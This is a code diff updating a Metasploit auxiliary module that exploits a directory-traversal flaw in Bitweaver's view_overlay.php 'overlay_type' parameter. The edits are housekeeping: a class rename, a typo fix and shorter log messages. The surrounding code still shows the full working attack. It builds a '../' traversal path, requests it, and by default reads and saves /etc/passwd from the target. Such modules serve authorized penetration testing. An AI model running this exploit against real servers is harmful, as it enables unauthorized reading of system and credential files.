@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -16,7 +13,7 @@ class Metasploit3 < Msf::Auxiliary
       'Name'           => 'Bitweaver overlay_type Directory Traversal',
       'Description'    => %q{
           This module exploits a directory traversal vulnerability found in Bitweaver.
-        When hanlding the 'overlay_type' parameter, view_overlay.php fails to do any
+        When handling the 'overlay_type' parameter, view_overlay.php fails to do any
         path checking/filtering, which can be abused to read any file outside the
         virtual directory.
       },
@@ -42,7 +39,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'The URI path to the web application', '/bitweaver/']),
         OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
         OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
-      ], self.class)
+      ])
   end
 
 
@@ -53,7 +50,7 @@ class Metasploit3 < Msf::Auxiliary
     fname = datastore['FILE']
     fname = fname[1, fname.length] if fname =~ /^\//
 
-    print_status("#{peer} - Reading '#{datastore['FILE']}'")
+    print_status("Reading '#{datastore['FILE']}'")
     traverse = "../" * datastore['DEPTH']
     res = send_request_cgi({
       'method'        => 'GET',
@@ -65,13 +62,13 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 200 and res.body =~ /failed to open stream\: No such file/
-      print_error("#{peer} - Cannot read '#{fname}'. File does not exist.")
+      print_error("Cannot read '#{fname}'. File does not exist.")
 
     elsif res and res.code == 200 and res.body =~ /failed to open stream\: Permission denied/
-      print_error("#{peer} - Cannot read '#{fname}'. Permission denied.")
+      print_error("Cannot read '#{fname}'. Permission denied.")
 
     elsif res and res.code == 200 and res.body =~ /Failed opening required/
-      print_error("#{peer} - Cannot read '#{fname}'. Possibly not vulnerable.")
+      print_error("Cannot read '#{fname}'. Possibly not vulnerable.")
 
     elsif res and res.code == 200
       data = res.body
@@ -86,13 +83,12 @@ class Metasploit3 < Msf::Auxiliary
       )
 
       vprint_line(data)
-      print_good("#{peer} - #{datastore['FILE']} stored as '#{p}'")
+      print_good("#{datastore['FILE']} stored as '#{p}'")
 
     else
-      print_error("#{peer} - Request failed due to some unknown reason")
+      print_error("Request failed due to some unknown reason")
     end
   end
-
 end
 
 =begin
